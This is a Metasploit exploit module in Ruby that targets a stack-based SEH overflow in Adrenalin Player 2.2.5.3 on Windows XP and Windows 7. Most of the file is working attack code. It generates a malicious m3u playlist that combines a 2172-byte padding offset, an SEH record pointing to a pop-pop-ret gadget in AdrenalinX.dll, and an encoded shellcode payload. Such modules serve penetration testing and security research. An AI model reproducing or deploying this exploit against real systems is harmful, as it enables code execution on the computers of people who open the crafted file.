##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	Rank = NormalRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'Adrenalin Player 2.2.5.3 SEH Overflow Exploit(msf)',
			'Description'	=> %q{
					This module exploits a stack based SEH overflow on Adrenalin Player <= 2.2.5.3.
					and generates a malicious m3u format file. 
					It has been tested both WinXP SP3 and Win7 korean version.
			},
			'License'		=> MSF_LICENSE,
			'Author'		=>
				[
					'seaofglass',	# Original discovery, MSF Module
				],
			'References'	=>
				[
					[ 'URL', '' ]
				],
			'DefaultOptions' =>
				{
					'ExitFunction' => 'thread', #none/process/thread/seh
				},
			'Platform'	=> 'win',
			'Payload'	=>
				{
					'BadChars' => "\x00\x0a\x0d\x1a",
					'DisableNops' => true,
				},

			'Targets'		=>
				[
					[ 'Windows XP / 7 KOR',
						{
							'Ret'   	=>	0x10124afb, # pop eax # pop esi # ret  - AdrenalinX.dll
							'Offset'	=>	2172
						}
					],
				],
			'Privileged'	=> false,
			'DisclosureDate'	=> '',
			'DefaultTarget'	=> 0))

		register_options([OptString.new('FILENAME', [ false, 'The file name.', 'msf.m3u']),], self.class)

	end

	def exploit

		buffer = rand_text_alpha_upper(target['Offset'])
		buffer << generate_seh_record(target.ret)
		buffer << make_nops(12)
		buffer << payload.encoded

		print_status("Creating '#{datastore['FILENAME']}'...")
		file_create(buffer)
		print_status("Done!")

	end
end
